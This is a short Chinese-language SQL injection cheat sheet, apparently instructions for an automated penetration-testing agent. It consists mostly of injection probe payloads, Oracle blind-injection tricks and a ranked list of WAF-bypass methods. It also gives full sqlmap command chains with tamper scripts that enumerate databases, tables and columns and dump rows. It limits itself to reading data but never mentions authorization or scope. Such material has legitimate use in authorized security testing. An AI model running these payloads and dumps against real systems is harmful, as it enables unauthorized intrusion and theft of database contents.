# SQL 注入秒杀卡 (≤50行)

## 前置判断（先确认是动态查询，再打）
- `.html/.jpg/.css/.js` 路径 → 静态文件，直接跳过
- 参数在 URL query / POST body / JSON / Header 中 → 测试

## 一击秒杀流程
```
1. 算术验证: id=2-1 是否等于 id=1？
2. 单引号: id=1' 是否报错/响应变化？
3. 双分号: id=1';-- 是否恢复正常？
4. Boolean: id=1 AND 1=1 vs id=1 AND 1=2 响应不同？
5. 延时: id=1' AND SLEEP(5)-- 是否延迟？
```

## 判型→回显 Oracle
```
ORDER BY → NVL2(NULLIF(1,1),列A,列B) 布尔基线
WAF 拦截 → LTRIM+NCHR+ASCII / REGEXP_COUNT 锚点
```

## WAF 绕过优先级
```
1. 换 Content-Type (multipart/form-data)
2. 函数替换 (NCHR→引号, REGEXP_COUNT→SUBSTR)
3. HPP 同名参数 + 参数位置交换
4. URL编码/双编码/大小写/空白字符
5. 不在同一模式死磕 >10 种方法
```

## sqlmap 完整利用链（固化命令）
```
# 1. 确认注入后 → 代理走 Burp 发完整请求
python tools/sqlmap-1.8/sqlmap.py -u "URL" --data "body" -H "Cookie:..." -p <参数> \
  --dbms <mysql|oracle|mssql|postgres> --technique B/E/T --level 3 --risk 2 --batch

# 2. WAF 拦截 → 换 tamper（列表: ls tools/sqlmap-1.8/tamper/）
  --tamper=space2comment,randomcase,between       # 空格→/**/ / 大小写 / = → BETWEEN

# 3. 只读提数（仅读不写）
  --dbs                                       # 库名
  -D <库> --tables                            # 表名
  -D <库> -T <表> --columns                   # 列名
  -D <库> -T <表> --dump --start 1 --stop 200 # 限量 dump 数据
```
仅读不写，不删改数据。→ 返回 S2: {命中?, 注入点, DBMS类型, 库表, 新发现接口?}
